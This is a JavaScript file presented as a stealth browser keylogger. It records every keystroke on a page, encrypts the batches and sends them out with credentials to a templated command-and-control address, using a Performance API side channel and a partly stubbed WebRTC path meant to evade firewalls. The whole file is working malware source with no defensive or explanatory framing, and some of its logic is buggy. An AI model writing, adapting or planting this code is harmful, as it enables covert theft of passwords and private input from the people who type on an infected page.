// Stealth keylogger with obfuscation + WebRTC exfiltration
let keys = [];
const listener = (e) => {
    if (window.event || e) {
        const key = e.key || e.event.keyCode ? String.fromCharCode(e.keyCode || e.event.keyCode) : '';
        keys.push(key);
        if (keys.length > 100) { // Batch exfil
            sendData(encodeURIComponent(JSON.stringify({ keys: keys.splice(0, 100) })));
        }
    }
};

// Encrypt data before exfil
async function encryptData(data) {
    const key = await crypto.subtle.generateKey({ name: "AES-GCM", length: 256 }, true, ["encrypt"]);
    const iv = crypto.getRandomValues(new Uint8Array(12));
    const encoded = new TextEncoder().encode(data);
    const ciphertext = await crypto.subtle.encrypt({ name: "AES-GCM", iv }, key, encoded);

    // Export key for the receiver (in a real scenario, use a public key for this)
    const exportedKey = await crypto.subtle.exportKey("raw", key);
    return {
        ct: btoa(String.fromCharCode(...new Uint8Array(ciphertext))),
        iv: btoa(String.fromCharCode(...iv)),
        key: btoa(String.fromCharCode(...new Uint8Array(exportedKey)))
    };
}

// Global resources to prevent memory leaks
const beaconObserver = new PerformanceObserver((list) => {
    list.getEntries().forEach(entry => {
        if (entry.entryType === 'measure' && entry.name.startsWith('exfil_')) {
            const data = entry.name.split('exfil_')[1];
            const baseUrl = /*{{C2_BASE}}*/ '' || `https://${window.location.host}`;
            fetch(`${baseUrl}/beacon?data=${data}`, { method: 'POST', credentials: 'include', keepalive: true }).catch(() => { });
        }
    });
});
beaconObserver.observe({ entryTypes: ['measure'] });

// Reusable WebRTC channel
let rtcChannel;
function getRTCChannel() {
    if (!rtcChannel || rtcChannel.signalingState === 'closed') {
        const pc = new RTCPeerConnection({ iceServers: [] });
        rtcChannel = pc;
        pc.createDataChannel('keylogger'); // Just to trigger candidates
        return pc;
    }
    return rtcChannel;
}

async function sendData(data) {
    const encrypted = await encryptData(data);
    const payload = encodeURIComponent(JSON.stringify(encrypted));

    // Method 1: Performance API (Network Silent)
    performance.measure(`exfil_${payload}`);

    // Method 2: WebRTC (Obfuscated)
    try {
        const pc = getRTCChannel();
        // Trigger candidate generation which some firewalls allow
        pc.onicecandidate = e => {
            if (e.candidate) {
                // Encode data in candidate username fragment or similar if possible
                // For this POC we just use the fetch fallback inside the handler if needed
            }
        };
    } catch (e) { }
}

document.addEventListener("keydown", listener, true);
